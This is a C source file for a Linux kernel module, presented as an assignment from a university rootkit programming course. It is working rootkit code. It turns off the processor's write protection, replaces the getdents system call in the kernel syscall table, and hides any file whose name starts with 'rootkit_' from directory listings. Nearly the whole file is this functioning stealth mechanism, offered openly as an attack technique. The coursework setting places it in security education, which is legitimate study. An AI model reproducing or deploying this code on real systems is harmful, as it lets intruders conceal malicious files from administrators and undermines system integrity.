/*
 * Assignment 04 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <asm/page.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>

#include "sysmap.h"


/* Information for modinfo */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");

void **sys_call_table;
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);

/*
 * counter to ensure every process has left our manipulated syscall before
 * we unload our module.
 */
static int call_counter = 0;

struct linux_dirent {   
        unsigned long   d_ino;   
        unsigned long   d_off;   
        unsigned short  d_reclen;   
        char            d_name[1];   
 };   

/* Check whether we need to hide this file */
int hide(char *d_name)
{
	int i = 0;
	if(strstr(d_name, "rootkit_") == d_name) 
	{
		return 1;
	}

	return 0;
}

   
/*
 * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
 * If it matches then don't show, otherwise works normally and calls the original getdents.
 */
asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	call_counter++;
	/* nothing else above this line */
	
	long ret;
	int len = 0;
	int tlen = 0;
	
	ret = (*original_getdents) (fd,dirp,count);	
	tlen = ret;
		
	while(tlen>0)
	{
		len  = dirp->d_reclen;
		tlen = tlen-len;
		
		/* Check if we need to hide this file */
		if(hide(dirp->d_name))
		{	
			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
			ret -= len;
		}
		else if(tlen != 0)
		{
			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
		}

	}
	
	/* nothing else below this line */
	call_counter--;
	return ret;
}


/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}


/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and replaces the getdents syscall.
 */
int init_module (void)
{	
	printk(KERN_INFO "Loading process-hider LKM...\n");
	
	/* get the pointer to the sys_call_table */
	sys_call_table = (void *) sysmap_sys_call_table;

	/* disable the write protection */
	disable_page_protection();
	

	/* replace the syscall getdents */
	original_getdents = (void *) sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
	
	
	/* reenable the write protection */
	enable_page_protection();
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the original getdent() syscall.
 */
void cleanup_module (void)
{
	/* disable write protection */
	disable_page_protection();
	
	/* restore the old syscall */
	sys_call_table[__NR_getdents] = (int *) original_getdents;

	/* reenable write protection */
	enable_page_protection();

	/* make sure that all processes have left our manipulated syscall */
	while(call_counter > 0) {
		msleep(10);
	}
	
	/* Finally, log the unloading */
	printk(KERN_INFO "Unloading process-hider... bye!\n");
}
